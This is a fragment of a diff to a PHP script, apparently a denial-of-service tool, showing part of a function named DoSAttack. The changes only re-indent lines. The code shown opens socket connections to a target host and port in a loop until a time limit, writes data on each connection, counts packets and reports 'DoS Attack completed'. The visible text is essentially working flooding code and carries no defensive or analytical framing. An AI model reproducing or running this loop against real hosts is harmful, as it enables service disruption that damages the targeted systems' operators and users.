@@ -26,17 +26,17 @@ function DoSAttack($host, $port, $method, $time){
     }
 
     while(1){	
-		$packets++;
+	$packets++;
     	if(time() > $time){
     		$out = 'DoS Attack completed; sent: '.$packets.' packets.';
-			break;
-		}
+		break;
+	}
 
-		$fp = fsockopen($pref.$host, $port, $errno, $errstr, 5);
+	$fp = fsockopen($pref.$host, $port, $errno, $errstr, 5);
 
-		if($fp){
-			fwrite($fp, $out);
-			fclose($fp);
+	if($fp){
+		fwrite($fp, $out);
+		fclose($fp);
     	}else{
     		$out = 'Couldn\'t connect to: '.$host.':'.$port.'; '.$errno.', '.$errstr;
     		break;
